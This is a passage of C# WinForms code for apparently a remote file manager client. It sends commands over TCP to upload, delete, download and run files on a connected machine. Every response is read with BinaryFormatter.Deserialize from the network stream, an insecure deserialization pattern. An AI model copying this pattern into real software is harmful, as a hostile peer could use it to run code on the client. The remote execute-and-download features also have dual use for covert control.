                Decimal fileSizeInMB = Convert.ToDecimal(length) / (1024.0m * 1024.0m);
                if(fileSizeInMB > 100.0m)
                {
                    MessageBox.Show("No Files Can Be Uploaded Above 100 Megabytes");
                    return;
                }

                SendCommand("preparetoreceivenext::" + currentpath + "\\" + openFileDialog1.SafeFileName);

                BinaryFormatter binFormatter = new BinaryFormatter();

                mainStream = cli.GetStream();
                string checkreadiness = (string)binFormatter.Deserialize(mainStream);

                if(checkreadiness.ToLower() == "ready")
                {
                    mainStream = cli.GetStream();
                    binFormatter.Serialize(mainStream, File.ReadAllBytes(openFileDialog1.FileName));
                }

                loadText.Visible = false;

                RefreshLView();
            }

        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(listView1.SelectedItems.Count <= 0)
            {
                MessageBox.Show("Please select files to delete first");
                return;
            }

            if(currentpath == "base")
            {
                MessageBox.Show("Do Not delete files/folders in this path");
                return;
            }

            DialogResult dialogResult = MessageBox.Show("Are you sure you want to delete " + listView1.SelectedItems.Count + " folders/files", "Confirmation", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.Yes)
            {
                foreach(ListViewItem itm in listView1.SelectedItems)
                {
                    if(itm.ImageIndex == 0)
                    {
                        SendCommand("delfolder::" + itm.SubItems[1].Text);

                        BinaryFormatter binFormatter = new BinaryFormatter();

                        mainStream = cli.GetStream();
                        string finisheddel = (string)binFormatter.Deserialize(mainStream);
                    }

                    if (itm.ImageIndex == 1)
                    {
                        SendCommand("delfiles::" + itm.SubItems[1].Text);

                        BinaryFormatter binFormatter = new BinaryFormatter();

                        mainStream = cli.GetStream();
                        string finisheddel = (string)binFormatter.Deserialize(mainStream);
                    }
                }

                RefreshLView();
            }
        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count <= 0)
            {
                MessageBox.Show("Please select file to execute first");
                return;
            }

            if (listView1.SelectedItems.Count > 1)
            {
                MessageBox.Show("Please only select one file to execute");
                return;
            }

            if(listView1.SelectedItems[0].ImageIndex == 0)
            {
                MessageBox.Show("Can only execute files");
                return;
            }

            SendCommand("executefl::" + listView1.SelectedItems[0].SubItems[1].Text);

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string finisheddel = (string)binFormatter.Deserialize(mainStream);
        }

        private void downloadFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count <= 0)
            {
                MessageBox.Show("Please select folder to download first");
                return;
            }

            if (listView1.SelectedItems.Count > 1)
            {
                MessageBox.Show("Please only select one folder to download");
                return;
            }

            if (listView1.SelectedItems[0].ImageIndex == 1)
            {
                MessageBox.Show("Only select a folders. Download a file with the Download File option.");
                return;
            }

            if (currentpath == "base")
            {
                MessageBox.Show("Cannot download from this path");
            }




            BinaryFormatter binFormatter = new BinaryFormatter();

            int myleng = listView1.SelectedItems[0].SubItems[1].Text.Length;
            SendCommand("getallfoldsindirs::" + listView1.SelectedItems[0].SubItems[1].Text);

            mainStream = cli.GetStream();
            string[] subdirspaths = (string[])binFormatter.Deserialize(mainStream);
            List<string> newsubfixed = new List<string>();

            foreach(string sre in subdirspaths)
            {
                newsubfixed.Add(sre.Substring(myleng));
            }

            SendCommand("getallfilesindirs::" + listView1.SelectedItems[0].SubItems[1].Text);

            mainStream = cli.GetStream();
            string[] subflspaths = (string[])binFormatter.Deserialize(mainStream);

            DialogResult dialogResult = MessageBox.Show(("Are you sure you want to save " + subflspaths.Length + " items?"), "Confirmation", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.No)
            {
                return;
            }

            CommonOpenFileDialog dialog = new CommonOpenFileDialog();
            dialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            dialog.IsFolderPicker = true;
            dialog.Title = "Choose Folder to Save Selected Files";
            if (dialog.ShowDialog() == CommonFileDialogResult.Ok)
            {
                loadText.Visible = true;
                Application.DoEvents();

                foreach(string subdir in newsubfixed)
                {
                    DirectoryInfo dirin = Directory.CreateDirectory((dialog.FileName + "\\" + listView1.SelectedItems[0].Text + subdir));
                    Console.WriteLine(dirin.FullName);
                }

                foreach(string flto in subflspaths)
                {
                    string subdirnamefl = flto.Substring(myleng);

                    string newlocalflname = (dialog.FileName + "\\" + listView1.SelectedItems[0].Text + subdirnamefl);

                    SendCommand("downloadfl::" + flto);

                    mainStream = cli.GetStream();
                    byte[] filebytes = (byte[])binFormatter.Deserialize(mainStream);

                    if (filebytes.Length <= 10)
                    {
                        try
                        {
                            if (Encoding.ASCII.GetString(filebytes) == "failure")
                            {
                                MessageBox.Show("File too large");
                            }
                            else
                            {
                                File.WriteAllBytes(newlocalflname, filebytes);
                            }
                        }
                        catch
                        {
                            File.WriteAllBytes(newlocalflname, filebytes);
                        }
                    }
                    else
                    {
                        File.WriteAllBytes(newlocalflname, filebytes);
                    }
                }

                loadText.Visible = false;
            }

        }

        private void newFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(currentpath == "base")
            {
                MessageBox.Show("Cannot make folder here.");
                return;
            }

            string foldername = Prompt.ShowTextDialog("Folder Name: ", "Choose Name");

            if(foldername == "")
            {
                MessageBox.Show("Folder must have name");
                return;
            }

            if (foldername.Contains("<"))
            {
                MessageBox.Show("No special characters allowed");
                return;
            }

            if (foldername.Contains(">"))
            {
                MessageBox.Show("No special characters allowed");
                return;
            }

            if (foldername.Contains(":"))
            {
                MessageBox.Show("No special characters allowed");
                return;
            }

            if (foldername.Contains("\""))
            {
                MessageBox.Show("No special characters allowed");
                return;
            }

            if (foldername.Contains("/"))
            {
                MessageBox.Show("No special characters allowed");
                return;
            }

            if (foldername.Contains("\\"))
            {
                MessageBox.Show("No special characters allowed");
                return;
            }

            if (foldername.Contains("?"))
            {
                MessageBox.Show("No special characters allowed");
                return;
            }

            if (foldername.Contains("|"))
            {
                MessageBox.Show("No special characters allowed");
                return;
            }

            if (foldername.Contains("*"))
            {
                MessageBox.Show("No special characters allowed");
                return;
            }

            SendCommand("createfolder::" + currentpath + "\\" + foldername);

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string checkfin = (string)binFormatter.Deserialize(mainStream);

            RefreshLView();
        }
    }
}
